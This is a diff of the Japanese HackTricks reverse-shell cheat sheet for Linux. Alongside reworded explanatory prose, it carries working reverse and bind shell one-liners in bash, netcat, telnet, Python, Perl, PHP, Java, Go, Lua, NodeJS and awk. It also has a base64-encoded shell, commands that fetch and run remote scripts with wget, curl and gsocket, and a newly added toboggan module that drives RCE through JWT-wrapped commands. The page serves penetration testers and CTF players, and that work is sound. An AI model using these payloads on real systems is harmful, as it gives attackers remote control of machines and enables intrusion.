@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **ハッキングテクニックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
+* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** をフォローする。**
+* **ハッキングトリックを共有するために PR を送信して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github リポジトリに貢献する。
 
 </details>
 
-**これらのシェルに関する質問がある場合は、**[**https://explainshell.com/**](https://explainshell.com) **で確認できます。**
+**これらのシェルに関する質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **で確認できます**
 
 ## フルTTY
 
-**リバースシェルを取得したら、[**このページを読んでフルTTYを取得**](full-ttys.md)**してください。**
+**リバースシェルを取得したら、[このページを読んでフルTTYを取得してください](full-ttys.md)**
 
 ## Bash | sh
 ```bash
@@ -46,11 +46,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### シェルの説明
 
-1. **`bash -i`**: このコマンドの部分は、インタラクティブ(`-i`)なBashシェルを開始します。
-2. **`>&`**: このコマンドの部分は、**標準出力（`stdout`）と標準エラー（`stderr`）を同じ場所にリダイレクト**するための短縮表記です。
+1. **`bash -i`**: この部分のコマンドは、インタラクティブ(`-i`)なBashシェルを起動します。
+2. **`>&`**: この部分のコマンドは、**標準出力（`stdout`）と標準エラー（`stderr`）を同じ宛先にリダイレクト**するための短縮表記です。
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、指定されたIPアドレスとポートへのTCP接続を表す特別なファイルです。
 * **出力とエラーストリームをこのファイルにリダイレクト**することで、コマンドはインタラクティブシェルセッションの出力を攻撃者のマシンに送信します。
-4. **`0>&1`**: このコマンドの部分は、**標準入力（`stdin`）を標準出力（`stdout`）と同じ場所にリダイレクト**します。
+4. **`0>&1`**: この部分のコマンドは、**標準入力（`stdin`）を標準出力（`stdout`）と同じ宛先にリダイレクト**します。
 
 ### ファイルを作成して実行
 ```bash
@@ -59,17 +59,49 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## フォワードシェル
 
-LinuxベースのWebアプリケーション内で**RCE脆弱性**に遭遇した場合、Iptablesルールや他のフィルタの存在により、**リバースシェルを取得することが難しくなる**場合があります。そのようなシナリオでは、パイプを使用して侵害されたシステム内でPTYシェルを作成することを検討してください。
+LinuxベースのWebアプリケーション内の**Remote Code Execution (RCE)**脆弱性を処理する際、逆シェルを達成することがiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。そのような制約のある環境では、より効果的に侵害されたシステムとやり取りするためにPTY（擬似端末）シェルを確立する代替手段があります。
 
-コードは[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)にあります。
+この目的のための推奨ツールは、[toboggan](https://github.com/n3rada/toboggan.git)であり、これにより対象環境とのやり取りが簡素化されます。
+
+tobogganを効果的に利用するには、対象システムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`という名前のモジュールは次のように構成されることがあります。
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+token = jwt.encode(
+{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+)
+
+response = httpx.get(
+url="https://vulnerable.io:3200",
+headers={"Authorization": f"Bearer {token}"},
+timeout=timeout,
+# ||BURP||
+verify=False,
+)
+
+# Check if the request was successful
+response.raise_for_status()
+
+return response.text
+```
+そして、次のコマンドを実行できます:
+```shell
+toboggan -m nix.py -i
+```
+直接インタラクティブシェルを活用するには、Burpsuite統合のために`-b`を追加し、より基本的なrceラッパーにするために`-i`を削除できます。
+
+別の可能性は、`IppSec`のフォワードシェル実装[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)を使用することです。
 
 次のように変更する必要があります：
 
 - 脆弱なホストのURL
 - ペイロードの接頭辞と接尾辞（あれば）
-- ペイロードの送信方法（ヘッダ？データ？追加情報？）
+- ペイロードの送信方法（ヘッダー？データ？追加情報？）
 
-その後、**コマンドを送信**したり、**`upgrade`コマンドを使用**して完全なPTYを取得したりできます（パイプは約1.3秒の遅延で読み取られ、書き込まれます）。
+その後、**コマンドを送信**したり、**`upgrade`コマンドを使用**して完全なPTYを取得したりできます（パイプは約1.3秒の遅延で読み取られ、書き込まれることに注意してください）。
 
 ## Netcat
 ```bash
@@ -87,7 +119,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnetは、ネットワーク上でコンピューターにリモートアクセスするためのプロトコルです。通常、Telnetを使用してリモートシェルに接続し、コマンドを実行することができます。
+Telnetは、ネットワーク上でコンピューターにリモートアクセスするためのプロトコルです。通常、Telnetを使用してリモートシェルに接続し、コマンドを実行することができます。 Telnetはセキュリティ上のリスクがあるため、代わりにSSHなどのより安全なプロトコルを使用することが推奨されています。
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -101,7 +133,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 while true; do nc -l <port>; done
 ```
 ```
-コマンドを送信するには、それを書き留めて、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）
+コマンドを送信するには、それを書き留め、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）
 
 **被害者**
 ```
@@ -110,7 +142,7 @@ export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X
 ```
 ## Python
 
-Pythonは、多くのハッカーにとってお気に入りのスクリプト言語です。Pythonは、シンプルで読みやすい構文を持ち、多くの便利なライブラリやフレームワークが利用できます。Pythonは、ネットワークスキャン、脆弱性スキャン、データ解析、自動化など、さまざまなハッキングタスクに使用されます。
+Pythonは、多くのハッカーにとってお気に入りのスクリプト言語です。Pythonは、シンプルで読みやすく、多くのOSで動作するため、ハッキングに最適です。Pythonは、ネットワークスキャン、データ解析、Webアプリケーションの開発など、さまざまなハッキングタスクに使用されます。
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -120,7 +152,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perlは、テキスト処理やシステム管理など、さまざまな用途に使用されるスクリプト言語です。UNIXシェルスクリプトの代替として使用されることがよくあります。Perlスクリプトは、シェルスクリプトよりも柔軟で強力な機能を提供し、多くのUNIXシステムに標準でインストールされています。
+Perlは、多くのUnixシステムで利用可能なスクリプト言語であり、シェルスクリプトの代替として使用されることがあります。Perlスクリプトは、システムコマンドを実行し、ファイルを操作し、ネットワークソケットを介して通信するために使用されます。Perlは、シェルスクリプトよりも柔軟で強力な機能を提供し、多くのハッカーにとって魅力的な選択肢となっています。
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -134,7 +166,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 ```
 ## PHP
 
-PHP（PHP: Hypertext Preprocessor）は、主にWeb開発に使用されるスクリプト言語です。PHPは、HTMLに埋め込んで使用することができ、データベースとの連携やフォーム処理など、さまざまなWebアプリケーション開発に適しています。PHPは、サーバーサイドで実行されるため、クライアントにコードが漏洩する心配はありません。
+PHP（Hypertext Preprocessor）は、Web開発に広く使用されるスクリプト言語です。PHPは、サーバーサイドで実行され、動的なWebページの生成に適しています。PHPは、HTMLに埋め込んで使用することができ、データベースとの連携も容易です。
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -147,8 +179,6 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 ## Java
-
-Javaは、オブジェクト指向プログラミング言語であり、多くのプラットフォームで使用されています。Javaは、セキュリティ、パフォーマンス、およびポータビリティに焦点を当てて設計されており、多くの企業や開発者によって広く採用されています。Javaのセキュリティモデルは、サンドボックス環境やセキュリティマネージャーを使用して、悪意のあるコードの実行を防ぎます。Javaのコンパイラは、コードの静的解析を行い、潜在的なセキュリティ脆弱性を検出するのに役立ちます。Javaのセキュリティに関する最新情報は、公式のOracle JavaセキュリティアドバイザリやCVEデータベースで入手できます。
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -156,49 +186,20 @@ p.waitFor()
 ```
 ## Ncat
 
-Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. It supports various protocols for network connections and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users.
+Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. It supports various protocols for network connections and security features like SSL. Ncat can be used for port scanning, banner grabbing, transferring files, and port redirection.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-### リモートシェル
-
-Golangを使用してリモートシェルを作成するために、以下の手順に従います。
-
-1. `os/exec` パッケージをインポートします。
-2. `Command` 関数を使用してコマンドを実行します。
-3. `Output` メソッドを使用してコマンドの出力を取得します。
-4. エラー処理を行います。
-
-以下は、Golangを使用してリモートシェルを作成するための基本的なコード例です。
-
-```go
-package main
-
-import (
-	"fmt"
-	"os/exec"
-)
-
-func main() {
-	cmd := exec.Command("ls", "-la")
-	out, err := cmd.Output()
-	if err != nil {
-		fmt.Println(err)
-	}
-	fmt.Println(string(out))
-}
-```
-
-このコードは、`ls -la` コマンドを実行し、その出力を取得して表示します。
+## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Luaは、軽量で高速なスクリプト言語であり、組み込みシステムやゲーム開発などのさまざまな用途に使用されています。Luaスクリプトを実行するためには、Luaのインタプリタが必要です。Luaはシンプルで直感的な構文を持ち、C言語との統合も容易です。Luaスクリプトは、Luaのインタプリタを介して実行されるため、実行環境にLuaのランタイムが必要です。
+Luaは、軽量で高速なスクリプト言語であり、組み込みシステムやゲーム開発などのさまざまな用途に使用されています。LuaはC言語で実装されており、シンプルな構文と強力な拡張性を備えています。Luaスクリプトは、Luaのインタプリタを介して実行されます。
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -207,7 +208,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-NodeJSは、非同期イベント駆動のJavaScriptランタイム環境であり、サーバーサイドでのJavaScript実行を可能にします。NodeJSは、Webアプリケーションやネットワークアプリケーションの開発に広く使用されています。
+NodeJSは、JavaScriptランタイム環境であり、サーバーサイドでのスクリプト実行に使用されます。NodeJSは非同期イベント駆動型のアーキテクチャを持ち、高速で効率的なネットワークアプリケーションの構築に適しています。
 ```javascript
 (function(){
 var net = require("net"),
@@ -293,7 +294,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 while true; do nc -l 79; done
 ```
 ```
-コマンドを送信するには、それを書き留めて、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）
+コマンドを送信するには、それを書き留め、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）
 
 **被害者**
 ```
@@ -304,9 +305,9 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-## Gawk
+### Gawk
 
-Gawkは、テキスト処理とパターンスキャンに特化した強力なプログラミング言語です。Linuxシェルスクリプト内で使用され、パイプ処理やファイル処理などのさまざまなタスクに役立ちます。Gawkは、フィールド分割、パターンマッチング、条件付き処理などの機能を提供し、シェルスクリプトの機能を拡張します。
+Gawkは、テキスト処理とパターンスキャンに特化した強力なプログラミング言語です。Linuxシェルスクリプト内で使用され、パイプ処理やフィルタリングに便利です。
 ```bash
 #!/usr/bin/gawk -f
 
@@ -335,7 +336,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-逆シェルをキャッチするために使用できる（ポート6001でリッスンします）:
+逆シェルをキャッチするために、以下を使用できます（ポート6001で待ち受けます）:
 ```bash
 # Authorize host
 xhost +targetip
@@ -344,7 +345,7 @@ Xnest :1
 ```
 ## Groovy
 
-[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)による注記: JavaリバースシェルはGroovyでも動作します。
+[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)による注意：JavaリバースシェルはGroovyでも機能します
 ```bash
 String host="localhost";
 int port=8044;
@@ -362,12 +363,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 <summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する。
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけてください
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローしてください。**
+* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。
 
 </details>
